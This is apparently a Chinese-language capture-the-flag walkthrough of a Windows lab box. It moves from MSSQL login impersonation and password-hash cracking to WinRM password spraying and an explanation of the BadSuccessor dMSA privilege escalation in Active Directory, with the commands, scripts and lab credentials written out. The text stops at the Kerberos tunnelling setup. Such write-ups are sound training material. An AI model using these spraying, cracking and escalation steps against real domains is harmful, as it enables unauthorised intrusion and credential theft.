# 侦察
## 凭证

机器信息:

	像现实生活中常见的 Windows 渗透测试一样，你将使用以下账户凭证启动 Eighteen 盒子：kevin/iNa2we6haRj2gaw!
#### 端口扫描

```
$ nmap -sC -sV -vv -oA 10.129.156.245

Nmap scan report for 10.129.156.245
Host is up, received echo-reply ttl 127 (0.32s latency).
Scanned at 2025-11-15 14:03:28 EST for 57s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON          VERSION
80/tcp   open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RC0+
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-11-16T02:04:29+00:00; +7h00m04s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-13T19:00:26
| Not valid after:  2055-11-13T19:00:26
| MD5:   44e1:e666:3f88:1148:9aa1:d47d:59d9:c214
| SHA-1: 979a:ab38:dc01:51b4:4291:6200:eef1:f5a4:f4db:5f1f
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQbVFyufWkmY9KQvQXa0xRkDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUxMTEzMTkwMDI2WhgPMjA1NTExMTMxOTAwMjZaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBALgj6Fxb
| Zd8kZ+XtcQJNX1IQQ/bOFnOMu9hXOuqUGYVDQ79sf8Rk0lc5aZrE+3OrjixbEjvE
| tw3DbkcT/hYc1QSQaCop/G4/SmpNoaagHfRRZIQ+ZhoBt6dSd9+hY9/ldcyDNk7J
| Tk+8h2dB5oXRc6U61BxUffwbeYsEJZubsEv8TtBLdz9pbXF0UlU4uPQxMPYXdKuC
| xIS1X1AVMXoPcc8ewT+qpU4GSsYlFsbOSrFYBgXgDZOXzBi2jrHxcR8tyafm4uIN
| LzRHU46D2rxZrmDPi+QpfIYzROnhCZG3s8ORBwGUKR8mhdDzIGWq8o1qh5dwMjtY
| ggLfXfUQg6YaMj3Glb8FRo8Uc+TSg6XYh2v6rQh0L2kHFj8UZqYWYNMFn6cJrQ84
| iugDE/u/bxZXgudF/xA1uiAxbPG7Jx+JkJjB17zTleUPDWnVTncw0/jwC7e01Ugp
| HeBytzARWPAXOmSgru+vhDtr9PT1zVQ0f/LfQJsTFj4t9iJtxVHav/48FQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQAo1c9vzHy6ktF+EOvti9DBV/1TXJgX/748rMfe
| n2E7SQX+YSPdszguAMWgLPu5H/8uBQQhB2Zv2gsOS98IYMu8DaowcHQABIUBCWKj
| 4zsgzzsiBesYvqBMPOKahmMLdmxQd8zfKH9sfcsrMWahaLgFWarrd3EHLCNyNfZU
| bNfQT2sDVFlw7k/XqTcbs61GtyQjwIkYrSskt86iqh0Khrs14n9HzxEGfz5zNaSE
| P61z1apAD5dFkNZWL8RySBBP93Xk5WRAxVREkd1cjDNt007c/y0tUonfrghWufGt
| Xdu4aYbdRHPmI6PInXbXg6Ed+MeHSz/P1ilpvder/uZ7tB/aoKGMF05Cm63tU4tw
| GCmrEsLEtGNtFhPT25hCbh3wNbfWppj2qGgDO4h1SMrMVwlazVmvGGjIcVCm+ZSb
| jELRKLD+hRqYXjPbU6G8C+rH1JuGPrIn1OpQsxYCRNlTkVSm0hQ9CxPO4yRvO/tY
| 3paLzBAaqFXy7FHTgrr9L60vfIY=
|_-----END CERTIFICATE-----
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m03s
```
- **域名**: `eighteen.htb`
## 初始访问

### MSSQL 枚举
#### SQL 身份验证（访客访问）
```BASH
impacket-mssqlclient 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.129.24.98'
```

**结果**：以 `guest` 身份连接，权限有限。
#### 枚举登录

```SQL
-- 检查当前用户
SELECT SYSTEM_USER, USER_NAME();

-- 列出数据库
SELECT name FROM master.dbo.sysdatabases;
```
#### 发现模拟权限

```SQL
enum_impersonate
```

**关键发现**：Kevin 可以假冒 `appdev` 登录!
#### 模拟 appdev 并访问数据库

```SQL
-- 冒充 appdev
EXECUTE AS LOGIN = 'appdev';

-- 核实
SELECT SYSTEM_USER, USER_NAME();

-- 访问 financial_planner 数据库
USE financial_planner;

-- 列出表格
SELECT name FROM sys.tables;
```
### 提取用户凭证

```SQL
SELECT * FROM users;
```
### 破解密码哈希

创建了一个 Python 脚本来破解 Flask PBKDF2 哈希：

```PYTHON
#!/usr/bin/env python3
import hashlib
import gzip
from multiprocessing import Pool, cpu_count

def check_password(args):
    password, salt, iterations, target_hash = args
    try:
        computed = hashlib.pbkdf2_hmac('sha256', password, salt.encode('utf-8'), iterations)
        if computed.hex() == target_hash:
            return password.decode('utf-8', errors='ignore')
    except:
        pass
    return None

# Hash components
salt = "<REDACTED_SALT>"
iterations = 600000
target_hash = "<REDACTED_HASH>"

# Run against rockyou.txt with multiprocessing
```

**破解密码**：iloveyou1

### 密码喷洒

但即使有管理员权限，这个 Web 应用也很简陋——没有暴露什么有趣的内容。

所以我们转向使用 Netexec 进行密码喷洒，目标是 RID 暴力枚举期间发现的用户账户。
```BASH
cat > users.txt <<EOF
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
EOF

nxc winrm eighteen.htb -u users.txt -p 'iloveyou1' --no-bruteforce
```

我们通过 WinRM 以 adam.scott / iloveyou1 的方式实现了远程 shell 访问：

### 枚举

我们应该熟悉 Flask 应用——总是查找存储在 Flask 配置中的错误配置的数据库凭证。来自 `C:\inetpub\eighteen.htb\app.py`：

```python
DB_CONFIG = {
    'server': 'dc01.eighteen.htb',
    'database': 'financial_planner',
    'username': 'appdev',
    'password': 'MissThisElite$90',
    'driver': '{ODBC Driver 17 for SQL Server}',
    'TrustServerCertificate': 'True'
}
```

这给了我们直接以 `appdev` 身份访问 MSSQL 的权限，但不是用于内部 `mssqlsvc` 账户

我们可以使用 NetExec 通过这个 MSSQL 账户探测权限提升的向量：

没有发现从 MSSQL 立即提升权限的途径——但我们注意到 NetExec 的指纹信息：
`Windows 11 / Server 2025 Build 26100`

这是一个非常新的 Windows 版本，仍在开发中，可能容易受到新发布的漏洞攻击。

### BloodHound

在成功获取 MSF Shell 后，我们上传 SharpHound.ps1 来枚举域关系：

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain eighteen.htb -DomainController "dc01.eighteen.htb" -zipFileName bh.zip
```

下载生成的 ZIP 文件，并将其加载到 BloodHound 中以可视化域图：

没有揭示直接的 AD 控制路径。因此，我们可以稍后使用 BloodyAD 或 PowerView 进行更细粒度的 ACE 检查，以发现隐藏的委派或配置错误的 DACLs。

#### BadSuccessor

- NetExec 将目标指纹识别为 Windows 11/Server 2025 版本 26100，该版本容易受到新发布漏洞的影响——这可能是由于该 Windows 预览版本中的功能尚未成熟和实验性所致。

- 此外，我们观察到 `mssqlsvc` 账户作为一个常规的 AD 用户对象存在，并具有主目录——这一行为与现代 Active Directory 环境中典型服务账户配置有所不同。

### dMSA 101

- MSA – 管理服务账户（单机）

- gMSA – 组管理服务账户（多台机器）

然后 Windows Server 2025 引入了 dMSA——委托管理服务账户。他们想要解决的问题：

- 用户倾向于使用老式的服务账户（普通的 AD 用户对象）在各个地方运行服务。

- 用户通常希望将它们迁移到更安全的托管模式，同时不破坏一切。

- 所以他们发明了 dMSA，并加入了迁移功能：

	- 用户创建一个 dMSA，该 dMSA“继承”了一个现有的传统服务账户。
	
	- 在后台，他们链接这两个账户，KDC 将 dMSA 视为继承者身份。

在迁移过程中，从机械角度来看：

- dMSA 对象获取属性，如：

	- `msDS-ManagedAccountPrecededByLink` → 指向原始用户（前任）
	
	- `msDS-DelegatedMSAState` → 迁移状态（准备中、已完成等）

当设置正确时，DC 基本上会说：

	“这个 dMSA 是那个旧账户的继任者；在认证方面，可以视它们为基本等同。”

这个想法在理论上很好——比如在我们这个案例中，一个普通的 AD 用户 `mssqlsvc` 可以作为服务账户运行敏感权限，这很方便。但随后发生了 BadSuccessor 事件。

### BadSuccessor 101

-  在 Windows Server 2025 域中，只要有一台运行该版本的 DC，dMSA 功能默认存在。

- 如果攻击者可以：

	- 创建或控制一个 dMSA 对象，并且
	
	- 设置其部分属性（特别是“前驱”链接）

- 他们可以欺骗 KDC，使其将那个 dMSA 视为任何目标账户（域管理员、域控制器等）的后继者。
- 结果：

	- dMSA 有效继承了目标的权限，
	
	- 我们就能获取目标账户的 Kerberos 密钥/PAC。

这意味着，只需极小的权限，我们就能提升到域中的任何主体。

### POC

BadSuccessor 仅在至少有一台运行 Windows Server 2025 的 DC 时才适用。已确认：

```
$ Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object ProductName, ReleaseId, DisplayVersion, CurrentBuildNumber, UBR

ProductName        : Windows Server 2025 Datacenter
ReleaseId          : 2009
DisplayVersion     : 24H2
CurrentBuildNumber : 26100
UBR                : 4349
```

BadSuccessor 仅在低权限账户能够创建/修改 dMSA（或者至少在某些可以存放 dMSA 的 OU 上具有创建/写入权限）时才有效。我们可以在上传 PowerView.ps1 后创建一个 PowerShell 脚本：

```POWERSHELL
Import-Module .\PowerView.ps1

$me = Get-DomainUser -Identity (whoami)

# Enumerate ACLs on OUs
Get-DomainOU | ForEach-Object {
    $ou = $_
    Get-DomainObjectAcl -Identity $ou.DistinguishedName -ResolveGUIDs |
        Where-Object {
            $_.IdentityReference -eq $me.SID -and
            ($_.ActiveDirectoryRights -match 'CreateChild|GenericAll|GenericWrite')
        } |
        Select-Object @{n='OU';e={$ou.Name}}, IdentityReference, ActiveDirectoryRights
}
```

输出显示：

- 在 `OU=Staff` 上：

	- 作为 adam.scott ，我们有 CreateChild （很多条目）

	- 还有 `GenericAll`

	- 甚至还有 `WriteDacl` ， `WriteOwner` 在同一行上

- 在 `OU=Domain Controllers` ：
	- 我们还有 `CreateChild`
	- 还有 `GenericAll` / `WriteDacl` / `WriteOwner`

在这种情况下我们可以：
- **创建一个 dMSA 对象**
- **完全控制其属性和安全描述符**

这正是 BadSuccessor dMSA 攻击需要的定位。

### Kerberos 身份验证

在我们的情况下，攻击路径被限制在 Kerberos 身份验证中。我们在运行 badsuccessor.py 时识别到这一限制——它因错误提示需要更强的身份验证（Kerberos 而不仅仅是 NTLM）而失败：

有各种方法可以绕过这个限制。由于 Kerberos 认证在内部可以通过 localhost 进行，我们可以使用 Ligolo-ng 将 127.0.0.1 隧道传输到我们的攻击机器上：

一旦隧道建立，我们便打开了内部 Kerberos 认证的大门。首先我们设置环境：

```bash
# export ticket to use
export KRB5CCNAME=adam.scott.ccache

# generate krb5.conf
./ft.sh 240.0.0.1 \
nxc smb 240.0.0.1 -u adam.scott -p iloveyou1 --generate-krb5-file ./krb5.conf

# export config
export KRB5_CONFIG=krb5.conf
```

**错误应对措施： `KRB_AP_ERR_SKEW`**

Kerberos 不容忍时间漂移。如果由于时间偏差导致身份验证失败，可以使用 faketime 方法重新校准时间或者部署 shell 包装器（ft.sh）

